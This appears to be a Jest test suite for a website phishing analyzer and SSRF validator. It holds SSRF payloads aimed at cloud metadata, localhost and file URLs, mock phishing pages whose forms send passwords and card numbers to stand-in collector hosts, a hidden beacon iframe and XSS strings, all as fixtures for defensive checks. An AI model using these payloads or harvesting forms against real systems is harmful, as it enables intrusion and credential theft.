import request from 'supertest';
import axios from 'axios';
import dns from 'dns/promises';
import { app } from '../src/app';
import { runMigrations } from '../src/database/migrations';
import { validateUrlForSSRF, isPrivateIPv4, isPrivateIPv6, normalizeIpString } from '../src/services/ssrfValidator';
import { analyzeWebsite } from '../src/services/websiteAnalyzer';
import { MLClient } from '../src/services/mlClient';

beforeAll(() => {
  runMigrations();
});

describe('Phase E.4 Website Analyzer & SSRF Security Test Suite', () => {
  beforeEach(() => {
    // Default DNS resolver mock for testing safe public destinations
    jest.spyOn(dns, 'lookup').mockImplementation(async (hostname: string) => {
      const h = String(hostname).toLowerCase();
      if (h === 'localhost' || h === '127.0.0.1') {
        return [{ address: '127.0.0.1', family: 4 }] as any;
      }
      if (h === '169.254.169.254' || h === 'metadata.google.internal' || h === 'instance-data') {
        return [{ address: '169.254.169.254', family: 4 }] as any;
      }
      if (h.startsWith('10.') || h.startsWith('192.168.') || h.startsWith('172.16.')) {
        return [{ address: h, family: 4 }] as any;
      }
      if (h === '::1') {
        return [{ address: '::1', family: 6 }] as any;
      }
      // Public test IP fallback
      return [{ address: '93.184.216.34', family: 4 }] as any;
    });
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  // 1. SSRF Unit Tests
  describe('SSRF Validator Unit Tests', () => {
    test('isPrivateIPv4 detects all RFC 1918, loopback, and metadata ranges', () => {
      expect(isPrivateIPv4('127.0.0.1')).toBe(true);
      expect(isPrivateIPv4('127.255.255.255')).toBe(true);
      expect(isPrivateIPv4('10.0.0.1')).toBe(true);
      expect(isPrivateIPv4('10.255.255.255')).toBe(true);
      expect(isPrivateIPv4('172.16.0.1')).toBe(true);
      expect(isPrivateIPv4('172.31.255.255')).toBe(true);
      expect(isPrivateIPv4('192.168.1.1')).toBe(true);
      expect(isPrivateIPv4('169.254.169.254')).toBe(true);
      expect(isPrivateIPv4('0.0.0.0')).toBe(true);
      expect(isPrivateIPv4('100.64.0.1')).toBe(true);
      expect(isPrivateIPv4('224.0.0.1')).toBe(true);
      expect(isPrivateIPv4('240.0.0.1')).toBe(true);

      // Public IPs
      expect(isPrivateIPv4('8.8.8.8')).toBe(false);
      expect(isPrivateIPv4('1.1.1.1')).toBe(false);
      expect(isPrivateIPv4('142.250.190.46')).toBe(false);
    });

    test('isPrivateIPv6 detects loopback, link-local, and unique local ranges', () => {
      expect(isPrivateIPv6('::1')).toBe(true);
      expect(isPrivateIPv6('::')).toBe(true);
      expect(isPrivateIPv6('fe80::1')).toBe(true);
      expect(isPrivateIPv6('fc00::1')).toBe(true);
      expect(isPrivateIPv6('fd12:3456:789a::1')).toBe(true);
      expect(isPrivateIPv6('::ffff:127.0.0.1')).toBe(true);
      expect(isPrivateIPv6('::ffff:192.168.1.1')).toBe(true);

      // Public IPv6
      expect(isPrivateIPv6('2001:4860:4860::8888')).toBe(false);
      expect(isPrivateIPv6('2606:4700:4700::1111')).toBe(false);
    });

    test('normalizeIpString detects decimal and hex encoded IPs', () => {
      expect(normalizeIpString('2130706433')).toBe('127.0.0.1');
      expect(normalizeIpString('0x7f000001')).toBe('127.0.0.1');
      expect(normalizeIpString('2886729729')).toBe('172.16.0.1');
      expect(normalizeIpString('google.com')).toBeNull();
    });

    test('validateUrlForSSRF blocks direct localhost, private IPs, metadata, and forbidden schemes', async () => {
      // Loopback
      expect((await validateUrlForSSRF('http://localhost')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://127.0.0.1')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://0.0.0.0')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://2130706433')).allowed).toBe(false); // Decimal IP

      // Private RFC 1918
      expect((await validateUrlForSSRF('http://192.168.1.1/admin')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://10.0.0.5:8080')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://172.16.0.10')).allowed).toBe(false);

      // Cloud Metadata
      expect((await validateUrlForSSRF('http://169.254.169.254/latest/meta-data/')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://metadata.google.internal')).allowed).toBe(false);

      // Forbidden Schemes
      expect((await validateUrlForSSRF('file:///etc/passwd')).allowed).toBe(false);
      expect((await validateUrlForSSRF('ftp://ftp.example.com')).allowed).toBe(false);
      expect((await validateUrlForSSRF('gopher://127.0.0.1')).allowed).toBe(false);
      expect((await validateUrlForSSRF('javascript:alert(1)')).allowed).toBe(false);
      expect((await validateUrlForSSRF('data:text/html,<h1>test</h1>')).allowed).toBe(false);

      // Forbidden Port
      expect((await validateUrlForSSRF('http://example.com:22')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://example.com:5432')).allowed).toBe(false);
      expect((await validateUrlForSSRF('http://example.com:6379')).allowed).toBe(false);

      // Public Valid Destinations
      expect((await validateUrlForSSRF('https://google.com')).allowed).toBe(true);
      expect((await validateUrlForSSRF('https://example.com/login')).allowed).toBe(true);
      expect((await validateUrlForSSRF('https://www.apnacollege.in/courses')).allowed).toBe(true);
    });
  });

  // 2. Website Analyzer DOM & Security Analysis Unit Tests
  describe('Website Analyzer Analysis & Evidence Generation', () => {
    test('Scenario A: Legitimate website with normal same-origin login is not flagged as phishing', async () => {
      const mockHtml = `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Apna College - Sign In to Your Learning Portal</title>
            <meta name="description" content="Official course player and learning management system." />
          </head>
          <body>
            <h1>Welcome to Apna College</h1>
            <form action="/api/auth/login" method="POST">
              <input type="email" name="email" placeholder="Email Address" />
              <input type="password" name="password" placeholder="Password" />
              <button type="submit">Sign In</button>
            </form>
          </body>
        </html>
      `;

      jest.spyOn(axios, 'get').mockResolvedValueOnce({
        status: 200,
        data: mockHtml,
        headers: { 'content-type': 'text/html' }
      } as any);

      jest.spyOn(MLClient, 'inferUrl').mockResolvedValueOnce({
        model_id: 'url-phishing',
        model_version: '2.0.0',
        detector_version: 'url-phishing-2.0.0',
        score: 0.000672,
        calibrated_probability: 0.000672,
        calibrated: true,
        predicted_class: 'legitimate',
        top_signals: [],
        features: { is_https: 1 },
        processing_time_ms: 2.0,
        errors: []
      });

      const res = await analyzeWebsite('https://www.apnacollege.in/login');
      expect(res.success).toBe(true);
      expect(res.pageIdentity?.title).toContain('Apna College');
      expect(res.formsSummary?.totalForms).toBe(1);
      expect(res.formsSummary?.externalActionForms).toBe(0);

      // Should not contain critical external form action mismatch
      expect(res.evidence.some(e => e.signal_id === 'website.form.mismatched_action_target')).toBe(false);
      expect(res.evidence.some(e => e.signal_id === 'website.brand.identity_mismatch')).toBe(false);
    });

    test('Scenario B: Phishing credential harvesting page with external action & brand spoofing triggers CRITICAL evidence', async () => {
      const mockPhishingHtml = `
        <!DOCTYPE html>
        <html>
          <head>
            <title>PayPal - Security Verification & Account Unlock</title>
          </head>
          <body>
            <h1>Verify Your PayPal Account</h1>
            <form action="http://malicious-drop-collector.cc/harvest.php" method="POST">
              <input type="text" name="email" placeholder="PayPal Email" />
              <input type="password" name="password" placeholder="Password" />
              <input type="text" name="cardNumber" placeholder="Credit Card Number" />
              <input type="text" name="cvv" placeholder="CVV" />
              <button type="submit">Unlock Account</button>
            </form>
          </body>
        </html>
      `;

      jest.spyOn(axios, 'get').mockResolvedValueOnce({
        status: 200,
        data: mockPhishingHtml,
        headers: { 'content-type': 'text/html' }
      } as any);

      jest.spyOn(MLClient, 'inferUrl').mockResolvedValueOnce({
        model_id: 'url-phishing',
        model_version: '2.0.0',
        detector_version: 'url-phishing-2.0.0',
        score: 0.9450,
        calibrated_probability: 0.9450,
        calibrated: true,
        predicted_class: 'phishing',
        top_signals: [{ signal: 'suspicious_tld', severity: 'medium', weight: 0.25 }],
        features: { has_suspicious_tld: 1 },
        processing_time_ms: 2.1,
        errors: []
      });

      const res = await analyzeWebsite('https://secure-login-update.tk/paypal-auth');
      expect(res.success).toBe(true);
      expect(res.formsSummary?.externalActionForms).toBe(1);

      // Check critical evidence signals
      expect(res.evidence.some(e => e.signal_id === 'website.form.mismatched_action_target')).toBe(true);
      expect(res.evidence.some(e => e.signal_id === 'website.brand.identity_mismatch')).toBe(true);
      expect(res.evidence.some(e => e.signal_id === 'website.form.insecure_http_action')).toBe(true);
    });

    test('Scenario C: Suspicious URL with website timeout retains URL ML evidence and explains limitation', async () => {
      jest.spyOn(axios, 'get').mockRejectedValueOnce(new Error('Connection timed out after 4000ms'));

      jest.spyOn(MLClient, 'inferUrl').mockResolvedValueOnce({
        model_id: 'url-phishing',
        model_version: '2.0.0',
        detector_version: 'url-phishing-2.0.0',
        score: 0.8900,
        calibrated_probability: 0.8900,
        calibrated: true,
        predicted_class: 'phishing',
        top_signals: [],
        features: {},
        processing_time_ms: 1.5,
        errors: []
      });

      const res = await analyzeWebsite('http://temporary-offline-phish.net/login');
      expect(res.status).toBe('fetch_error');
      expect(res.evidence.some(e => e.signal_id === 'url.ml.phishing_prediction')).toBe(true);
      expect(res.evidence.some(e => e.signal_id === 'website.fetch.timeout_or_unreachable')).toBe(true);
      expect(res.limitations.some(l => l.includes('timeout'))).toBe(true);
    });

    test('Scenario D: Clean URL with deceptive webpage content triggers high-severity website evidence', async () => {
      const mockDeceptiveHtml = `
        <!DOCTYPE html>
        <html>
          <head>
            <title>Bank of America - Account Suspension Immediate Resolution</title>
          </head>
          <body>
            <h1>Sign in to Bank of America</h1>
            <form action="https://external-theft-logger.org/submit" method="POST">
              <input type="password" name="pass" />
              <button>Submit</button>
            </form>
          </body>
        </html>
      `;

      jest.spyOn(axios, 'get').mockResolvedValueOnce({
        status: 200,
        data: mockDeceptiveHtml,
        headers: { 'content-type': 'text/html' }
      } as any);

      jest.spyOn(MLClient, 'inferUrl').mockResolvedValueOnce({
        model_id: 'url-phishing',
        model_version: '2.0.0',
        detector_version: 'url-phishing-2.0.0',
        score: 0.0100,
        calibrated_probability: 0.0100,
        calibrated: true,
        predicted_class: 'legitimate',
        top_signals: [],
        features: { is_https: 1 },
        processing_time_ms: 1.8,
        errors: []
      });

      const res = await analyzeWebsite('https://neutral-portal.example.com/notice');
      expect(res.success).toBe(true);
      expect(res.evidence.some(e => e.signal_id === 'website.brand.identity_mismatch')).toBe(true);
      expect(res.evidence.some(e => e.signal_id === 'website.form.mismatched_action_target')).toBe(true);
    });

    test('Executable download links and hidden iframes are captured as evidence', async () => {
      const mockPayloadHtml = `
        <!DOCTYPE html>
        <html>
          <head><title>Software Update Center</title></head>
          <body>
            <a href="https://example.com/downloads/patch_update_installer.exe">Download Patch Installer</a>
            <iframe src="https://hidden-tracking.net/beacon" width="0" height="0" style="display:none"></iframe>
          </body>
        </html>
      `;

      jest.spyOn(axios, 'get').mockResolvedValueOnce({
        status: 200,
        data: mockPayloadHtml,
        headers: { 'content-type': 'text/html' }
      } as any);

      jest.spyOn(MLClient, 'inferUrl').mockResolvedValueOnce({
        model_id: 'url-phishing',
        model_version: '2.0.0',
        detector_version: 'url-phishing-2.0.0',
        score: 0.05,
        calibrated_probability: 0.05,
        calibrated: true,
        predicted_class: 'legitimate',
        top_signals: [],
        features: {},
        processing_time_ms: 1.2,
        errors: []
      });

      const res = await analyzeWebsite('https://patch-updater.org/download');
      expect(res.evidence.some(e => e.signal_id === 'website.download.executable_payload')).toBe(true);
      expect(res.evidence.some(e => e.signal_id === 'website.dom.hidden_iframe')).toBe(true);
    });
  });

  // 3. API Integration Tests (POST /api/v1/scans/website)
  describe('Website Scan API Endpoint Integration (POST /api/v1/scans/website)', () => {
    test('POST /api/v1/scans/website blocks SSRF attempts with 422 error', async () => {
      const res = await request(app)
        .post('/api/v1/scans/website')
        .send({ url: 'http://127.0.0.1/admin/debug' });

      expect(res.status).toBe(422);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('SSRF_BLOCKED');
      expect(res.body.data.risk_level).toBe('CRITICAL');
    });

    test('POST /api/v1/scans/website executes legitimate website scan end-to-end', async () => {
      const mockHtml = `
        <!DOCTYPE html>
        <html>
          <head><title>Example Domain Information</title></head>
          <body><h1>Example Domain</h1><p>This domain is for use in illustrative examples.</p></body>
        </html>
      `;

      jest.spyOn(axios, 'get').mockResolvedValueOnce({
        status: 200,
        data: mockHtml,
        headers: { 'content-type': 'text/html' }
      } as any);

      jest.spyOn(MLClient, 'inferUrl').mockResolvedValueOnce({
        model_id: 'url-phishing',
        model_version: '2.0.0',
        detector_version: 'url-phishing-2.0.0',
        score: 0.0001,
        calibrated_probability: 0.0001,
        calibrated: true,
        predicted_class: 'legitimate',
        top_signals: [],
        features: { is_https: 1 },
        processing_time_ms: 1.5,
        errors: []
      });

      const res = await request(app)
        .post('/api/v1/scans/website')
        .send({ url: 'https://example.com' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.scan_type).toBe('website');
      expect(res.body.data.risk_level).toBe('LOW');
      expect(res.body.data.page_title).toBe('Example Domain Information');
      expect(res.body.data.model_versions).toContain('url-phishing-2.0.0');
      expect(res.body.data.model_versions).toContain('website-dom-2.0.0');
    });

    test('XSS payloads in HTML title and attributes are safely parsed as text and not executed', async () => {
      const xssHtml = `
        <!DOCTYPE html>
        <html>
          <head><title><script>alert("XSS_IN_TITLE")</script></title></head>
          <body><h1>Heading with <img src=x onerror=alert(1)></h1></body>
        </html>
      `;

      jest.spyOn(axios, 'get').mockResolvedValueOnce({
        status: 200,
        data: xssHtml,
        headers: { 'content-type': 'text/html' }
      } as any);

      jest.spyOn(MLClient, 'inferUrl').mockResolvedValueOnce({
        model_id: 'url-phishing',
        model_version: '2.0.0',
        detector_version: 'url-phishing-2.0.0',
        score: 0.01,
        calibrated_probability: 0.01,
        calibrated: true,
        predicted_class: 'legitimate',
        top_signals: [],
        features: {},
        processing_time_ms: 1.0,
        errors: []
      });

      const res = await request(app)
        .post('/api/v1/scans/website')
        .send({ url: 'https://xss-test.example.com' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      // Cheerio extracts the text content without executing script
      expect(res.body.data.page_title).toContain('alert("XSS_IN_TITLE")');
    });
  });
});
